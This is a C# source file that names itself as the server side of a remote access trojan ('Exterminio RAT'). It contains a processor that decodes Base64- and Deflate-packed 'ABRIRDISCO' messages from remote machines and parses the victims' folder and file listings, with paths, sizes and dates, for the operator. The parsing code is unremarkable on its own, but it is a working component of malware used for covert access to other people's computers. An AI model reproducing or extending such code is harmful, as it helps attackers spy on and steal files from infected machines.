using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Collections.Generic;

namespace Exterminio_RAT_Servidor
{
    public class AbrirDiscoProcessor
    {
        public static string ProcesarDatosAbrirDiscoRecibidos(string datosRecibidos)
        {
            try
            {
                Console.WriteLine($"Procesando datos de archivos recibidos: {datosRecibidos.Length} caracteres");
                
                // Verificar que los datos empiecen con "ABRIRDISCO:"
                if (!datosRecibidos.StartsWith("ABRIRDISCO:"))
                {
                    Console.WriteLine("Datos de archivos no tienen el formato correcto (debe empezar con 'ABRIRDISCO:')");
                    return "ERROR: Formato incorrecto";
                }
                
                // Extraer la parte Base64 (después de "ABRIRDISCO:")
                string base64Data = datosRecibidos.Substring(11); // "ABRIRDISCO:" tiene 11 caracteres
                Console.WriteLine($"Datos Base64 extraídos: {base64Data.Length} caracteres");
                
                // Decodificar Base64
                byte[] compressedData = Convert.FromBase64String(base64Data);
                Console.WriteLine($"Datos decodificados de Base64: {compressedData.Length} bytes");
                
                // Descomprimir con Deflate
                byte[] decompressedData = DecompressData(compressedData);
                Console.WriteLine($"Datos descomprimidos: {decompressedData.Length} bytes");
                
                // Convertir a string
                string archivosInfo = Encoding.UTF8.GetString(decompressedData);
                Console.WriteLine($"Información de archivos procesada: {archivosInfo}");
                
                return archivosInfo;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando datos de archivos: {ex.Message}");
                return $"ERROR: {ex.Message}";
            }
        }
        
        private static byte[] DecompressData(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            using (MemoryStream decompressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
                {
                    deflateStream.CopyTo(decompressedStream);
                }
                return decompressedStream.ToArray();
            }
        }
        
        public static FileSystemEntry[] ParsearInformacionArchivos(string archivosInfo)
        {
            try
            {
                List<FileSystemEntry> entries = new List<FileSystemEntry>();
                
                // Verificar que la información tenga el formato correcto
                if (!archivosInfo.StartsWith("[ARCHIVOS]"))
                {
                    Console.WriteLine("Formato de información de archivos incorrecto");
                    return entries.ToArray();
                }
                
                // Extraer la parte entre [ARCHIVOS] y el final
                int startIndex = archivosInfo.IndexOf("|") + 1;
                int endIndex = archivosInfo.LastIndexOf("]");
                
                if (startIndex <= 0 || endIndex <= startIndex)
                {
                    Console.WriteLine("No se pudo extraer la información de archivos");
                    return entries.ToArray();
                }
                
                // Incluir el último ] en la extracción
                string archivosData = archivosInfo.Substring(startIndex, endIndex - startIndex + 1).Trim();
                Console.WriteLine($"Información de archivos extraída: '{archivosData}'");
                
                // Buscar todas las ocurrencias de [CARPETA y [ARCHIVO en la cadena
                for (int i = 0; i < archivosData.Length - 8; i++)
                {
                    // Buscar carpetas
                    if (archivosData.Substring(i, 9) == "[CARPETA(")
                    {
                        int startBracket = i;
                        int endBracket = archivosData.IndexOf(']', startBracket);
                        
                        if (endBracket != -1)
                        {
                            string carpetaString = archivosData.Substring(startBracket, endBracket - startBracket + 1);
                            FileSystemEntry entry = ParsearCarpeta(carpetaString);
                            if (entry != null)
                            {
                                entries.Add(entry);
                                Console.WriteLine($"Carpeta encontrada: {entry.Nombre}");
                            }
                        }
                    }
                    // Buscar archivos
                    else if (archivosData.Substring(i, 9) == "[ARCHIVO(")
                    {
                        int startBracket = i;
                        int endBracket = archivosData.IndexOf(']', startBracket);
                        
                        if (endBracket != -1)
                        {
                            string archivoString = archivosData.Substring(startBracket, endBracket - startBracket + 1);
                            FileSystemEntry entry = ParsearArchivo(archivoString);
                            if (entry != null)
                            {
                                entries.Add(entry);
                                Console.WriteLine($"Archivo encontrado: {entry.Nombre}");
                            }
                        }
                    }
                }
                
                Console.WriteLine($"Parseados {entries.Count} elementos del sistema de archivos");
                return entries.ToArray();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parseando información de archivos: {ex.Message}");
                return new FileSystemEntry[0];
            }
        }
        
        private static FileSystemEntry ParsearCarpeta(string carpetaString)
        {
            try
            {
                // Formato: [CARPETA(nombre)(rutaCompleta)(fechaCreacion)]
                string carpeta = carpetaString.Substring(9, carpetaString.Length - 10); // Remover [CARPETA( y )]
                
                // Extraer nombre (primer paréntesis)
                int nombreStart = 0;
                int nombreEnd = carpeta.IndexOf(")(");
                if (nombreEnd == -1) return null;
                
                string nombre = carpeta.Substring(nombreStart, nombreEnd - nombreStart);
                
                // Extraer ruta completa (segundo paréntesis)
                int rutaStart = nombreEnd + 2;
                int rutaEnd = carpeta.IndexOf(")(", rutaStart);
                if (rutaEnd == -1) return null;
                
                string rutaCompleta = carpeta.Substring(rutaStart, rutaEnd - rutaStart);
                
                // Extraer fecha (tercer paréntesis)
                int fechaStart = rutaEnd + 2;
                int fechaEnd = carpeta.LastIndexOf(")");
                if (fechaEnd == -1) return null;
                
                string fechaCreacion = carpeta.Substring(fechaStart, fechaEnd - fechaStart);
                
                return new FileSystemEntry
                {
                    Nombre = nombre,
                    Tipo = "CARPETA",
                    Ruta = rutaCompleta,
                    Tamaño = "0B",
                    FechaModificacion = fechaCreacion
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parseando carpeta '{carpetaString}': {ex.Message}");
                return null;
            }
        }
        
        private static FileSystemEntry ParsearArchivo(string archivoString)
        {
            try
            {
                // Formato: [ARCHIVO(nombre)(extension)(rutaCompleta)(tamaño)(fechaModificacion)]
                string archivo = archivoString.Substring(9, archivoString.Length - 10); // Remover [ARCHIVO( y )]
                
                // Extraer nombre (primer paréntesis)
                int nombreStart = 0;
                int nombreEnd = archivo.IndexOf(")(");
                if (nombreEnd == -1) return null;
                
                string nombre = archivo.Substring(nombreStart, nombreEnd - nombreStart);
                
                // Extraer extensión (segundo paréntesis)
                int extStart = nombreEnd + 2;
                int extEnd = archivo.IndexOf(")(", extStart);
                if (extEnd == -1) return null;
                
                string extension = archivo.Substring(extStart, extEnd - extStart);
                
                // Extraer ruta completa (tercer paréntesis)
                int rutaStart = extEnd + 2;
                int rutaEnd = archivo.IndexOf(")(", rutaStart);
                if (rutaEnd == -1) return null;
                
                string rutaCompleta = archivo.Substring(rutaStart, rutaEnd - rutaStart);
                
                // Extraer tamaño (cuarto paréntesis)
                int tamañoStart = rutaEnd + 2;
                int tamañoEnd = archivo.IndexOf(")(", tamañoStart);
                if (tamañoEnd == -1) return null;
                
                string tamaño = archivo.Substring(tamañoStart, tamañoEnd - tamañoStart);
                
                // Extraer fecha (quinto paréntesis)
                int fechaStart = tamañoEnd + 2;
                int fechaEnd = archivo.LastIndexOf(")");
                if (fechaEnd == -1) return null;
                
                string fechaModificacion = archivo.Substring(fechaStart, fechaEnd - fechaStart);
                
                return new FileSystemEntry
                {
                    Nombre = nombre,
                    Tipo = "ARCHIVO",
                    Ruta = rutaCompleta,
                    Tamaño = tamaño,
                    FechaModificacion = fechaModificacion
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parseando archivo '{archivoString}': {ex.Message}");
                return null;
            }
        }
    }
    
    public class FileSystemEntry
    {
        public string Nombre { get; set; }
        public string Tipo { get; set; } // "CARPETA" o "ARCHIVO"
        public string Ruta { get; set; }
        public string Tamaño { get; set; }
        public string FechaModificacion { get; set; }
        
        public override string ToString()
        {
            return $"{Tipo}: {Nombre} - {Ruta} - {Tamaño} - {FechaModificacion}";
        }
    }
}
